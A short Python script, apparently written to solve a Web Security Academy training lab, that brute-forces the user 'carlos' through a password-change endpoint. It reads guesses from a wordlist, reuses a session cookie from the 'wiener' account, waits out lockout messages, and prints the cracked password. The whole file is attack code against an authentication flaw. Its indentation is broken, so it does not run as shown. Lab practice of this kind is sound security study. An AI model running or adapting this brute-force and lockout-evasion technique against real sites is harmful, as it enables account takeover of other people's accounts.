import requests
import re
import time

passwords = open("passwords.txt","r")

for i in passwords:
	data = {"username":"wiener","password":"peter"}
	respuesta1 = requests.post("https://0a8e00ca04814f9c82150bdc008200f7.web-security-academy.net/login", data=data, allow_redirects=False)
	coincidencia = re.findall("You have made too many incorrect",respuesta1.text)
	if coincidencia != []:
		time.sleep(60)
	else :
	cookies1 = respuesta1.cookies
	data1 = {"username":"carlos","current-password":i.strip(),"new-password-1":"dina1","new-password-2":"dina1"}
	respuesta2 = requests.post("https://0a8e00ca04814f9c82150bdc008200f7.web-security-academy.net/my-account/change-password", data=data1, cookies=cookies1)
	coincidencia1 = re.findall("Password changed successfully!",respuesta2.text)
		if coincidencia1 != []:
			print("La contraseña de carlos es: "+i.strip())
			quit()
	
